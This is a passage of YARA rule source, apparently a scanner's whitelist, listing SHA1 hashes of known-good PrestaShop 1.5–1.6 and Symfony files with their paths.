        hash.sha1(0, filesize) == "25ef7629092ade53b34bdb72f0c22743aae07895" or // classes/Image.php
        hash.sha1(0, filesize) == "7df76f9f379d88ca050cbc4f3466f838ec6802b7" or // classes/Tools.php
        hash.sha1(0, filesize) == "6deceae47f17276138fead444e64947c00e1bd99" or // classes/Tab.php
        hash.sha1(0, filesize) == "9779407600eeb9dd1e6729771500a1d2b67e3bac" or // modules/statsforecast/statsforecast.php
        hash.sha1(0, filesize) == "e126115596f5ad511afbf0682bfb2747e831c2cb" or // install-new/upgrade/classes/Module.php
        hash.sha1(0, filesize) == "52d943c91c9909701b407f97b673adbd1d93b3cb" or // modules/blockcategories/blockcategories.php
        hash.sha1(0, filesize) == "dc9903d52d6adbab408373ab2cb5770fae9e8360" or // classes/Dispatcher.php
        hash.sha1(0, filesize) == "3ff018798794d176b0bd193ff7ce32e8597cb268" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "84b2bdb064cc7438102e238fe5d7caf597abe7f7" or // modules/productcomments/productcomments.php
        hash.sha1(0, filesize) == "95a0d8797a5151db07e86f9a5d2de9e7fb66d4ce" or // install-new/classes/xmlLoader.php

        /* Prestashop 1.5.0.3 */
        hash.sha1(0, filesize) == "7e6dcb1181e0c7f47e638abb408bf365aaed161d" or // classes/Link.php
        hash.sha1(0, filesize) == "0f58accbc5172fe0ef4b4973cfd236d66da6b6a8" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "29d2f6ffd69fd35a5cf1730c370eeb2ec5e9a460" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "8e01742446ea863722407baa356e121c6db973f1" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "f02735d8bf07f24f17dc01e48a10c2838d97f4d0" or // classes/Module.php
        hash.sha1(0, filesize) == "ede4dbd5a9ef8a8f4c705a04469772b00368c5f3" or // controllers/admin/AdminProductsController.php
        hash.sha1(0, filesize) == "dd6e1624463e0da22b4ffbd0b27700f8f722498e" or // modules/themeinstallator/themeinstallator.php
        hash.sha1(0, filesize) == "839c9107a8db07273a66f2602e5ff68c662c5178" or // install-new/models/install.php
        hash.sha1(0, filesize) == "a04a1141e4292eeceb7567db94715030a8865e58" or // classes/Product.php
        hash.sha1(0, filesize) == "397981267bcf82bf12ce2032d13c373d7857d25e" or // install-dev/index.php
        hash.sha1(0, filesize) == "6b93d28af71f5bbf201d56922c72d1e2c784f51c" or // classes/Language.php
        hash.sha1(0, filesize) == "196a2f0810b0034e34fa024e4bc63f7764332668" or // classes/Tools.php
        hash.sha1(0, filesize) == "bec5f7293da27cf49ff34c14274b056eabb3b3e6" or // classes/Tab.php
        hash.sha1(0, filesize) == "66f3dc50226acf0985b2c43afa069c95e3a0c972" or // classes/Dispatcher.php
        hash.sha1(0, filesize) == "7594e1eae77c0aeda977f9d288bae3b9e6609322" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "5ce9a61fc9ec4ebbe6c4f8d0435dbd85c6ff630f" or // install-new/classes/xmlLoader.php

        /* Prestashop 1.6.0.1 */
        hash.sha1(0, filesize) == "81b420c5d8fa7ae40e36c8c1a8720e945b8d0f9e" or // tools/tcpdf/tcpdf.php
        hash.sha1(0, filesize) == "92ca42f51f3aaea36e0e3c6ba4bbad8dcdd334fe" or // install-dev/data/img/t/AdminSubDomains.gif
        hash.sha1(0, filesize) == "7c1dd47776d00e5756ec22ea798e07b77fe6709c" or // classes/Link.php
        hash.sha1(0, filesize) == "b1ac32e7b7d752337713e238acc5249a9cec648e" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "4f9ac18927da5166fefe8158e61edf5485e01bc6" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "01f81d802c442530ed2d83d7d3e328cffb867793" or // install-dev/fixtures/fashion/data/generate_attribute.php
        hash.sha1(0, filesize) == "bab64b6222cfdcb0bc5b5b533f4062a41bde671b" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "1d5744a7c7b12143e199f280ad4db6e47a673f6e" or // modules/homeslider/homeslider.php
        hash.sha1(0, filesize) == "31952fa7458295239c4dc2d980685f7419afe4f1" or // modules/pscleaner/pscleaner.php
        hash.sha1(0, filesize) == "5edb689475a63687000799f45bf20e2ce51d256d" or // install-dev/theme/img/ok.gif
        hash.sha1(0, filesize) == "efd42b45df2b2465a8370b4bfc3a67fdf4602320" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "73c6ccc6c9d53ab473836a92105ade71533dcf85" or // modules/homeslider/upgrade/install-1.2.1.php
        hash.sha1(0, filesize) == "12c6a49c2211dcc36447993f5c302df0f99b696f" or // themes/default-bootstrap/img/top-banner.gif
        hash.sha1(0, filesize) == "2d98f498a619d0b3d663b8b76948ddb81b7c9950" or // install-dev/theme/img/ajax-loader-small.gif
        hash.sha1(0, filesize) == "1cb353a3a28e1162acfffd331641c6f788031e7f" or // classes/Product.php
        hash.sha1(0, filesize) == "34970ce1144ffcc03f1bc43cdb29f895de1be094" or // controllers/admin/AdminShopUrlController.php
        hash.sha1(0, filesize) == "a808d31309987adf310aedd356ab00555dd6505c" or // tools/tcpdf/barcodes.php
        hash.sha1(0, filesize) == "0170e2cc9cec433f30bc2da9c35b239e36102e4f" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "b833690de6a37ae35ec2cabf2794718fd0f4fd1d" or // classes/helper/HelperOptions.php
        hash.sha1(0, filesize) == "60977cb1dde0e8e9da170504320223bee7978780" or // install-dev/upgrade/php/p15014_copy_missing_images_tab_from_installer.php
        hash.sha1(0, filesize) == "8dda5db858efab326ef487e80a60c05553cbbf62" or // tools/smarty/sysplugins/smarty_internal_templatelexer.php
        hash.sha1(0, filesize) == "f0d6ff896487315561b31c0e187f879cc0546f86" or // classes/Language.php
        hash.sha1(0, filesize) == "5b47e798345178be2fa24d1921e6aaedb3f9f091" or // classes/Tools.php
        hash.sha1(0, filesize) == "3e0a999ca21c23677f0c5fcea71328b1b66e8b4f" or // modules/productcomments/productcomments.php
        hash.sha1(0, filesize) == "fd2d5855e14a73f5a8d8c6a503ed20745feb7794" or // img/admin/ajax-loader-yellow.gif
        hash.sha1(0, filesize) == "c9f0bfae97d3a70d41a04aab432d73a5bdf4c2b5" or // classes/module/Module.php
        hash.sha1(0, filesize) == "b5c2c9f05f4c5c83cf28693b5b080365cdd34e20" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "4aef51aae0ffc29c5fe087edbbd1085ce18e544b" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "0ef1c023cef7f94409b8d99df1fa854ffaf988ea" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "43f7660872183c1a7163edd29e0d89af24439169" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "20e6ff8533cbc9d2649e233734dd10934c7790f7" or // install-dev/classes/xmlLoader.php

        /* Prestashop 1.6.0.2 */
        hash.sha1(0, filesize) == "55b8cd2d139bbb0d6e79cb42d0aafe15eb9e734a" or // classes/Link.php
        hash.sha1(0, filesize) == "690cc587337797e2d563925dc0e9ec8791477f9a" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "ace6033b09ed05cdd6dd436cacd82227a7e50d1d" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "1e6f294bb2fab19c3a75ef8753cda945624217cd" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "28b8e7742c6cc7e4464ffe88056fdb4210be2806" or // modules/homeslider/homeslider.php
        hash.sha1(0, filesize) == "eac9aaf750aca322290f40f3a8b0c119af7852de" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "46b7fb0fdc7dab23bda8b0962973a44d36a7d64d" or // classes/Product.php
        hash.sha1(0, filesize) == "53160f3399bda4824c24d35d63f4f5d76ed64997" or // controllers/admin/AdminShopUrlController.php
        hash.sha1(0, filesize) == "fce27ced44d72d1e79d59b6a3ebc09205fd65b73" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "4009303dabc4e4da6f7030e1ab107910421bf4fd" or // modules/dashgoals/dashgoals.php
        hash.sha1(0, filesize) == "db0210610748cf9cff45d8c16a038be67a0fd965" or // classes/Language.php
        hash.sha1(0, filesize) == "d2bfbe963981c734b90a08ddc1006583502d5751" or // classes/Tools.php
        hash.sha1(0, filesize) == "f1dfebdff574bd39f104427b5f629375445de110" or // classes/module/Module.php
        hash.sha1(0, filesize) == "e81f747985ba3625a8f2c6f05a3b5f5279dbeeac" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "e38c17c481b001663d0541ff4a18e793b3613fd1" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "8d0e5eb4558d2ffc05b772141f23f8c6b4c4a4ff" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "7efd55846aca109d9129fb01e5e67229612dc13d" or // controllers/admin/AdminModulesController.php

        /* Prestashop 1.6.0.3 */
        hash.sha1(0, filesize) == "9dd9c432f75d1bdc44a5b140c830066780b04dc5" or // tools/tcpdf/tcpdf.php
        hash.sha1(0, filesize) == "3e4b5f39fbdb96ee82687bfe0aceb534e1f34557" or // classes/Link.php
        hash.sha1(0, filesize) == "4a51e7e336d2278c090ab9e7775c69ccf534cbbe" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "4fa17b4b59c66758755102dead7316b0e0daac79" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "701b1c764ae042721c0002e39c40a2a9a2686c0a" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "7cb4d961c830c3cf0d23f73a9bb7aa4f5d02f637" or // modules/homeslider/homeslider.php
        hash.sha1(0, filesize) == "4edd4035a384ed38d3619f3729d3ca538c872997" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "3d76d4c8866ee5500a16fe65d5dedb14f39974e0" or // classes/Product.php
        hash.sha1(0, filesize) == "5457d676715b35ba0b4342acd860401cd8ef9381" or // controllers/admin/AdminShopUrlController.php
        hash.sha1(0, filesize) == "cb69ad340bce9f1afd53d5a7478703d3b1b876be" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "536123a61d5f1f2b43c18fa74b2de9dac3f124b7" or // classes/helper/HelperOptions.php
        hash.sha1(0, filesize) == "bdfbaf0a390c278baf589c23d4d67cfa1d985e52" or // install-dev/upgrade/php/p15014_copy_missing_images_tab_from_installer.php
        hash.sha1(0, filesize) == "c29351b370bbb4c977d6b8472df2daf59644a163" or // modules/dashgoals/dashgoals.php
        hash.sha1(0, filesize) == "f553437c0b40abf613f598f5eae2035b47dda856" or // classes/Language.php
        hash.sha1(0, filesize) == "947912282892826402fbb929c7eb50c0554b7b0b" or // classes/Tools.php
        hash.sha1(0, filesize) == "4cdbeb0f5e26ba6b0a88aa5a49ac37acfb36009b" or // tools/pclzip/pclzip.lib.php
        hash.sha1(0, filesize) == "ecd533ff6fbd3dd10f7951c1e07750abb03fe01d" or // controllers/front/PageNotFoundController.php
        hash.sha1(0, filesize) == "f66871da2447b21e49afdbf9a917cc63ec4136bb" or // classes/module/Module.php
        hash.sha1(0, filesize) == "b0f8be64d263ea837077b432752cee52fd28005b" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "533b36787a8ffc351c1973aa6d302e505db8593b" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "349361cee45792efbc3f08bdda331e8d3003736f" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "29a168c1337c7c8724cd1eafbef8dea7f73d0f6d" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "ce158ef43637d0ddaa6830cbe40ff1c8748a4701" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "3124223ce6ee7c652df33e2d4b6a28f2022c1314" or // install-dev/classes/xmlLoader.php

        /* Prestashop 1.6.0.4 */
        hash.sha1(0, filesize) == "3dab59e7732766859869780f0a32462043d0548e" or // admin-dev/filemanager/include/utils.php
        hash.sha1(0, filesize) == "17bc6596b0bd2efd490512f3060e502c875fddff" or // classes/Link.php
        hash.sha1(0, filesize) == "dc58024cf55557f91b67b956cf008c6e39d6ea16" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "eda64e338f08f30810c457b633e443396872fa79" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "f91b0683727f7c1cb2afb77b902c2b945b9ff225" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "573db0ad3bc6374756a7b97bae5c7fbcb4256185" or // modules/homeslider/homeslider.php
        hash.sha1(0, filesize) == "b1ee8d2a78f4c0a2d33eae02db94b0720b6c8c3d" or // admin-dev/filemanager/dialog.php
        hash.sha1(0, filesize) == "b6f228c0dec08b702316343ff6424a434e966e0b" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "93805053a42dd8b4bb933c9a63c89abcfcff11ff" or // classes/Product.php
        hash.sha1(0, filesize) == "2b5d66b41ab7d1bccb90da8259ed6961c7817232" or // controllers/admin/AdminShopUrlController.php
        hash.sha1(0, filesize) == "df2d4dc8ded58796fa2eab93a8fbafa46aa40b68" or // modules/dashgoals/dashgoals.php
        hash.sha1(0, filesize) == "ab40ea0dc6703e483748a617f2ef174e6f4f6386" or // classes/Language.php
        hash.sha1(0, filesize) == "3821c944b207fd70089df488dbf2b363fd46dbee" or // classes/Tools.php
        hash.sha1(0, filesize) == "6360a0e687bfb5fc31d0ebf86ba32b0d09979a12" or // controllers/front/PageNotFoundController.php
        hash.sha1(0, filesize) == "abd197535e680a39598c598a250079616e808ca8" or // classes/module/Module.php
        hash.sha1(0, filesize) == "51d9030b48f61929ef8dabec5ab37b2d76c5476d" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "8da15373f5177beefb1e77f5d8e9e791d5b7a3a4" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "95696d6b23c411bdc3d2760d3030566a9dab8857" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "a4bcc729ad6129919e8fcd9456b1ef1f294fd15a" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "f313b4ef749cbeb6234bf177459e343102a4c578" or // admin-dev/filemanager/execute.php

        /* Prestashop 1.6.0.5 */
        hash.sha1(0, filesize) == "acc0e6bd294e064692680c605949ee728c0f0ca3" or // img/admin/export.gif
        hash.sha1(0, filesize) == "099694e6dbc5c450cd5ec49aa95569d8226d5ba3" or // install-dev/data/img/os/order_state_12.gif
        hash.sha1(0, filesize) == "cc99343c14fe8f59367d9a484cb572abca63cc02" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "06b6499533a0d4ee957893498fd94559705e1bd3" or // modules/homeslider/homeslider.php
        hash.sha1(0, filesize) == "27511801177be19c73909ef622190aea13d97c7d" or // install-dev/theme/img/ok.gif
        hash.sha1(0, filesize) == "27511801177be19c73909ef622190aea13d97c7d" or // img/admin/ok.gif
        hash.sha1(0, filesize) == "099694e6dbc5c450cd5ec49aa95569d8226d5ba3" or // install-dev/data/img/os/Payment_remotely_accepted.gif
        hash.sha1(0, filesize) == "17be7ef93a37c61731af95a6cdf3c8be80db6330" or // classes/Product.php
        hash.sha1(0, filesize) == "5df8065acb193d3eb8f8ad301da7f6ad4663a888" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "d67005150a3d06f04e45f39ecb2fea3688e06ec7" or // classes/Language.php
        hash.sha1(0, filesize) == "e2c7826775bc0448278e987cdf71e5bd01729bc2" or // classes/Tools.php
        hash.sha1(0, filesize) == "3a1f84dabe229d0cf576b9e30ef96db65837956d" or // classes/module/Module.php
        hash.sha1(0, filesize) == "b3d1fbdf0a6062eaf1e253be351da787588b7f53" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "f2967a1fb92a5c0808fc1b718e15e9d5df35e071" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "c81a048c01d07c513524729fb392d68d7ac5d98d" or // install-dev/classes/xmlLoader.php

        /* Prestashop 1.6.0.6 */
        hash.sha1(0, filesize) == "8be613d99da6561f41c29472aab1f2cca9db5106" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "6f38f2cd54433b3c5f3c01faef2de8e279000831" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "15b2c2f57b671b8d84f963659dd5e2c9f3634540" or // controllers/admin/AdminModulesPositionsController.php
        hash.sha1(0, filesize) == "603685ab446951a3c261fa2754b081ed9bff328a" or // admin-dev/filemanager/dialog.php
        hash.sha1(0, filesize) == "ae4ccf3c2da9b2f9c9139780c75447a5a35a531f" or // classes/Product.php
        hash.sha1(0, filesize) == "cbe884a582670b1d8187dd14ad270ccef9f70a01" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "cd42cecaede0c824a368fe24aed4e097ce3dd0ad" or // install-dev/upgrade/php/p15014_copy_missing_images_tab_from_installer.php
        hash.sha1(0, filesize) == "0d46aa184356ca4a89f33285fc04063eb7990416" or // classes/Language.php
        hash.sha1(0, filesize) == "a0f5bbac6b472156c3514d7fc0731abd97a7a855" or // classes/Tools.php
        hash.sha1(0, filesize) == "8ef6a8b75a20f034123233a9a91c0a50e28652c3" or // classes/module/Module.php
        hash.sha1(0, filesize) == "32b6712ddb4ac6bcf6ff9776a8b32c505ba80053" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "af6f0d6f89683d1b39c60562a55b811e2d88a408" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "cc506804da42b2d05e655f2d44cc3dc3901a8310" or // controllers/admin/AdminModulesController.php

        /* Prestashop 1.6.0.7 */
        hash.sha1(0, filesize) == "22ff7bac1825b18b0a76cba6572c91d560fa886f" or // classes/Link.php
        hash.sha1(0, filesize) == "bea9807242f5c142fc1e7943de293f574f25a385" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "53d0df4b78b7fc47ebbc9d9e3e55c0d51e6ad3a9" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "cde0b5269fb9cbd72f2ecde7ed05ec8de06859a8" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "6ef1d73229d3f1dd8fd2267fe2476bc045653ee3" or // controllers/admin/AdminModulesPositionsController.php
        hash.sha1(0, filesize) == "2a8ee528479f857bdac121143ec2c1e237c67ef6" or // admin-dev/filemanager/dialog.php
        hash.sha1(0, filesize) == "ef8472e820d4f6cf1d872b22e12853083acedf32" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "839877a3de44de99f5eb2ca9bef5325cc85bba63" or // classes/Product.php
        hash.sha1(0, filesize) == "795978a02893a56414aad162d964869065f7ada5" or // controllers/admin/AdminShopUrlController.php
        hash.sha1(0, filesize) == "de9673ceed3845ed70da9f89ac18ace37867ff66" or // classes/helper/HelperOptions.php
        hash.sha1(0, filesize) == "05e6a4df5b538034355c3fc32cf6a44cffe5de7a" or // classes/Language.php
        hash.sha1(0, filesize) == "9baa2abc25e67bd3bb5836c0ed7fcc7794e02d36" or // classes/Tools.php
        hash.sha1(0, filesize) == "8ba7854c0726ccc2dc52a0e1cf5fa2dffea8631d" or // classes/module/Module.php
        hash.sha1(0, filesize) == "515958889d1f43f733c736403cae25ea112ff7ff" or // classes/controller/AdminController.php
        hash.sha1(0, filesize) == "b5e004690ddd4f874ffd29e3035affe123f444fc" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "0e1787f25aaf7afe43bf7e070363d74a03b660f9" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "c5675e45d36d28b03f157d003ddea1a4ddd857b3" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "016c12de39e4cc3f669ffd32002392427b8a530f" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "bc0e9e6b50830668c889b39f1a5bac17c9e47007" or // install-dev/classes/xmlLoader.php

        /* Prestashop 1.6.0.8 */
        hash.sha1(0, filesize) == "72ec6a9b904ed21a5c28b5b473dfd971b185affb" or // classes/Product.php
        hash.sha1(0, filesize) == "2e683c79aa381fff1d9d5ba4f54118cf0e7986b3" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "a4c0d15be948337a4a52aa97c15f22a115e1cd4a" or // classes/Language.php
        hash.sha1(0, filesize) == "9f1735fa1830d665029c2a55fa86facf6ce04d0a" or // classes/Tools.php
        hash.sha1(0, filesize) == "4f2847e12ce84a46bc8aeef5fa72cd6b1e805c46" or // classes/module/Module.php
        hash.sha1(0, filesize) == "24ce20b535597656a9b569bdd1bbe1ca4b62d170" or // classes/controller/AdminController.php

        /* Prestashop 1.6.0.9 */
        hash.sha1(0, filesize) == "d6f714325b08ae0efa1da983250fca7ec5b3bbb3" or // classes/webservice/WebserviceOutputJSON.php
        hash.sha1(0, filesize) == "64319668487fcb38d514f74b4adea4910ce97424" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "f2a23e23c71a25fbcb0cacecf4441f8e8a6a6f17" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "3ee65cc93e88e05e01498851d5f16e9d2b0c1507" or // controllers/admin/AdminModulesPositionsController.php
        hash.sha1(0, filesize) == "48aa2e97ff63d90191fcd75dcb7c164c693ff375" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "6226f84423e99874b3e9c336e07a48af84122a24" or // classes/Product.php
        hash.sha1(0, filesize) == "2164959b083e705e4091142a56c0a8d5f3ce125c" or // tools/tcpdf/barcodes.php
        hash.sha1(0, filesize) == "b3ed5f5b7a28ec3b6324e2144bdf4bc9b3024ebc" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "9a7832fdfe7d2d835aedb3496a983a3b716eb03a" or // classes/Tools.php
        hash.sha1(0, filesize) == "817d8d482ba662c417cd642577a1391ced1e2f36" or // classes/module/Module.php
        hash.sha1(0, filesize) == "fe876f205ced3f5d675369bdb8e3e26f55c96969" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "f166d20367aa526c5a97dfd149bfe04c678e7626" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "6126aa1380c85f07e86693f314a55a603b594b2f" or // controllers/admin/AdminModulesController.php

        /* Prestashop 1.6.0.10 */
        hash.sha1(0, filesize) == "a27db505ef30105452584226d12950ca10f03a20" or // classes/Link.php
        hash.sha1(0, filesize) == "2914576203f8d9298bce1cf64ece9b13831f03c7" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "2dd72770f25ab12c6463c95c78ca16c6eb93c9a0" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "540b1021e81802b9e46a46ed93a53bcc56ef8d32" or // controllers/admin/AdminModulesPositionsController.php
        hash.sha1(0, filesize) == "cf42abf3acb66cd483f3eb702af63c569919a71b" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "fd8841ef76a2842f8e290ea894eb27898fdf0da4" or // classes/Product.php
        hash.sha1(0, filesize) == "3dd18d6eca2f46f305081ee4b91a6d44cfb78d0e" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "a959a24c27c4acb8ffec330f445faba43c7e5bf2" or // classes/Tools.php
        hash.sha1(0, filesize) == "3dec82df45581048301b11938ab7e8864617519e" or // classes/module/Module.php
        hash.sha1(0, filesize) == "4adf1915fbd6f83bff62d6938f5551ffd7b5ac26" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "dc62d0faef36661c59714d82c81fabf97217bf72" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "68c1d42a94e291d288bb249da31c1c46e94e6593" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "e1d953c2e7dc2ad79f317ec1f44019c7b7857bd8" or // controllers/admin/AdminModulesController.php

        /* Prestashop 1.6.0.11 */
        hash.sha1(0, filesize) == "b52eb8496b2775b9002101bab490633ceede43e8" or // classes/Link.php
        hash.sha1(0, filesize) == "3777e46bf4d2ee17b4d63b28f8331cd37703bdc2" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "f13f878250948e8631dc5c082ab0e91fe24b1657" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "077149bc9622e696bf787e0be601ef8182c4a920" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "b717c4c2cb31f4abd72b5594b5a341a936a9efb1" or // controllers/admin/AdminModulesPositionsController.php
        hash.sha1(0, filesize) == "c7bc9b8334d60019b87aad4f8227934fa651a8dc" or // admin-dev/filemanager/dialog.php
        hash.sha1(0, filesize) == "95ce8223bc1bb2f5b4ae64e2a1a3688590add147" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "33b121b1710ec0295684aef7774755623f756cb3" or // classes/Product.php
        hash.sha1(0, filesize) == "9310699b95e685238d4de81e2239938f435acda4" or // classes/webservice/WebserviceRequest.php
        hash.sha1(0, filesize) == "b241f935a8cc39decbcbab51497b96ebc32c6956" or // classes/helper/HelperOptions.php
        hash.sha1(0, filesize) == "d739926e88305774f59634b7cd4e56418d8d0d3c" or // install-dev/upgrade/php/p15014_copy_missing_images_tab_from_installer.php
        hash.sha1(0, filesize) == "5572b8b0a2d8f16993b312b1faeb7f3569b9d072" or // classes/Language.php
        hash.sha1(0, filesize) == "1e407e54688e6781b41f3b8e4765e2164d3059ee" or // classes/Tools.php
        hash.sha1(0, filesize) == "4e828fbed04d70fb9e6a088ec18e6c9a0ece732f" or // controllers/front/PageNotFoundController.php
        hash.sha1(0, filesize) == "f9b1cf035f431ad5bc3cdac576543c43bca935eb" or // classes/module/Module.php
        hash.sha1(0, filesize) == "29bbbdf03cb6cef01c8c25f665aee95e6b6e6c59" or // admin-dev/filemanager/include/utils.php
        hash.sha1(0, filesize) == "03cd7b8ba03109c1c6eead5590aa3f9e1db1c385" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "f92e1b3c6eb9a9600d82520a8ba48c5570565787" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "a7c458761746f1d3338f51135c9e42d5bd123179" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "29fa0df4fb7cb6b553a6f979919d685980a8f091" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "4acfcdac1408da3ab7d6b765631c4c1c37c5ecbf" or // install-dev/classes/xmlLoader.php

        /* Prestashop 1.6.0.12 */
        hash.sha1(0, filesize) == "034d0a6240de7cdc72129eeacc63b717d850e927" or // classes/Link.php
        hash.sha1(0, filesize) == "39239e986d8cac6c7268c11d9ead59d8246e48aa" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "78dca5078814418fc0e562981b6c519e2a97aa1f" or // install-dev/models/install.php
        hash.sha1(0, filesize) == "d5e03b73ebf9578b9847e860be4c699010c45110" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "7e0166a95a3355a143e10b16d35c00a8abde584c" or // admin-dev/filemanager/dialog.php
        hash.sha1(0, filesize) == "eae3c3f2f866163f7f338b53bd4076e6075c4fab" or // controllers/admin/AdminProductsController.php
        hash.sha1(0, filesize) == "dd5aeb96c779524ecfd46ff7f9a4c3f94fbd71ed" or // classes/Product.php
        hash.sha1(0, filesize) == "765205561a82ea891eac89a4aeaefed00a0d0653" or // classes/Tools.php
        hash.sha1(0, filesize) == "162a753296bae91b20d5e1a12f19a0586530c9d6" or // controllers/front/PageNotFoundController.php
        hash.sha1(0, filesize) == "65f5e60bfe83bed806224aad950a5e2841695227" or // classes/module/Module.php
        hash.sha1(0, filesize) == "52c86bc1664083d510dd629cb5bf8c5bf0ab55dd" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "6c3d219eacb1f5bcf67f86526cc5f6d53bf652f0" or // classes/helper/HelperList.php
        hash.sha1(0, filesize) == "3cc1310cef9f9168a6382519b3f01d785d9fb185" or // controllers/admin/AdminModulesController.php

        /* Prestashop 1.6.0.14 */
        hash.sha1(0, filesize) == "b756e05efff2f24cbad3df5ccf4494d2435d5f1f" or // classes/module/Module.php
        hash.sha1(0, filesize) == "905d6098fea83a484c6a31d269dc3e255fb300d7"    // controllers/admin/AdminModulesController.php

}/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

import "hash"

private rule Symfony : CMS
{
    meta:
        generated = "2018-05-30T11:41:41.112501"

    condition:
        /* Symfony 2.0.19 */
        hash.sha1(0, filesize) == "1fd782e06d6f9deabbc1a79542d53f7ae35a4308" or // tests/Symfony/Tests/Component/Security/Http/Firewall/DigestDataTest.php

        /* Symfony 3.0.0 */
        hash.sha1(0, filesize) == "73b94cff56707cecf81493590a8ef318ef31faee" or // src/Symfony/Component/Process/ExecutableFinder.php
        hash.sha1(0, filesize) == "393474833397003658a3e05883afea9715d3e1d8" or // src/Symfony/Component/HttpKernel/UriSigner.php
        hash.sha1(0, filesize) == "dc0c2d801a89f2e4a1be3722c91a363ddb2f7ab9" or // src/Symfony/Component/VarDumper/Caster/ExceptionCaster.php

        /* Symfony 3.0.9 */
        hash.sha1(0, filesize) == "a10a4593f4df6dbb804a10bf3db8b47cd71edfd0" or // src/Symfony/Component/Console/Application.php
        hash.sha1(0, filesize) == "a6155a3b5d89fe330ed8627953b76d3d31867e8e" or // src/Symfony/Component/Security/Http/Tests/Firewall/DigestAuthenticationListenerTest.php
        hash.sha1(0, filesize) == "6896951a4f46633697b6c9e193ea996bde3685a5" or // src/Symfony/Component/VarDumper/Caster/ExceptionCaster.php

        /* Symfony 4.0.0 */
